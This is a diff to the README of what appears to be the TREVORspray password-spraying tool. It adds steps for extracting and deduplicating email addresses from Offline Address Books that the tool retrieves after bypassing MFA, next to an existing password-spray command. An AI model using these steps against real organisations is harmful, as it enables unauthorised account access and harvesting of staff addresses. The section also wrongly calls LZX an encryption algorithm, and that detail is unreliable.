@@ -94,6 +94,24 @@ done | tee f.last.txt
 trevorspray -u f.last.txt -p 'Fall2021!'
 ```
 
+## Extract data from downloaded LZX files
+When TREVORspray successfully bypasses MFA and retrieves an Offline Address Book (OAB), the address book is downloaded in LZX format to `~/.trevorspray/loot`. LZX is an ancient and obnoxious encryption algorithm used by Microsoft.
+~~~bash
+# get libmspack (for extracting LZX file)
+git clone https://github.com/kyz/libmspack
+cd libmspack/libmspack/
+./rebuild.sh
+./configure
+make
+
+# extract LZX file
+./examples/.libs/oabextract ~/.trevorspray/loot/deadbeef-ce01-4ec9-9d08-1050bdc41131-data-1.lzx oab.bin
+# extract all strings
+strings oab.bin
+# extract and dedupe emails
+egrep -oa '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}' oab.bin | tr '[:upper:]' '[:lower:]' | sort -u
+~~~
+
 ## TREVORspray - Help:
 ```
 $ trevorspray --help
